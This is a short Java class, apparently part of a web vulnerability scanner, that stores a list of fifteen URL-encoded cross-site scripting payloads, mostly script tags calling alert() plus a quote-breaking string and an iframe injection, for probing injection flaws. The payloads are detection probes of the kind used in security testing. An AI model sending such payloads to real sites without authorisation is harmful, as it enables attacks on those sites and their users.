/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package PayloadSignature.A3Injection;

/**
 *
 * @author shacojx
 */
public class XSS {

    private static String[] arrPayXSS;

    public XSS() {
        arrPayXSS = new String[]{
            "script%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
            "%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E",
            "%3CScRipT%3Ealert%28%22XSS%22%29%3B%3C%2FScRipT%3E",
            "%3Cscript%3Ealert%28123%29%3C%2Fscript%3E",
            "%3Cscript%3Ealert%28%22hellox+worldss%22%29%3B%3C%2Fscript%3E",
            "%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E+",
            "+%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E+",
            "%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E",
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            "%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E",
            "%3Cscript%3Ealert%28%2FXSS%22%29%3C%2Fscript%3E",
            "%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E",
            "%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
            "%27%3B+alert%281%29%3B",
            "%3Ciframe%3E%3Ch1%3ETest12345%3C%2Fh1%3E%3C%2Fiframe%3E",};
    }

    public String[] getArrPayXSS() {
        return arrPayXSS;
    }
}
